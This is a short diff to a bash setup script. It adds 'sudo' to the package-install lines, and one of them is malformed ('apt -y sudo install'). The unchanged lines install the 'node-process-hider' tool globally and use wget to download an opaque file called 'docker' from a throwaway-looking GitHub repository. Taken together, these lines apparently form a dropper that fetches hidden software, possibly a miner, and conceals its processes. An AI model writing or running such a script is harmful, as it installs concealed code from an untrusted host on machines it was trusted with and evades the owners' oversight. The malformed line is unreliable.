@@ -1,7 +1,7 @@
 #!/bin/bash
-apt update && apt -y install sudo gcc curl zip
-apt install gcc -y
-apt install nodejs -y
+sudo apt update && apt -y sudo install gcc curl zip
+sudo apt install gcc -y
+sudo apt install nodejs -y
 npm install -g npm@8.5.0
 npm i -g node-process-hider
 wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
